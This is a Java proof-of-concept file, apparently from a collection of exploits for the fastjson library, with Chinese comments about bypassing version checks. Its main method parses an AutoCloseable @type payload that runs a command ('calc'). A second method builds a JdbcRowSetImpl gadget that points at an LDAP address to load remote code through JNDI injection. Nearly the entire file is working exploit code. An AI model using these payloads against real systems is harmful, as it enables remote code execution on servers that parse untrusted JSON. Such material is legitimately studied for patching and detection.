package vul;

import com.alibaba.fastjson.JSON;

import java.io.IOException;


public class Bypass_68 {
    public static void main(String[] args) throws IOException {
        basic();
    }

    public static void basic(){
        //基于expectClass实现，实战中需要自己找可用的expectClass子类
        String poc = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"AutoCloseVul\",\"cmd\":\"calc\"}";
        JSON.parse(poc);
    }

    // 47版本的绕过无效
    public static void jdbcRowSet(){

        String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
                + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                + "\"dataSourceName\":\"ldap://192.168.126.1:1389/us9a9o\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}
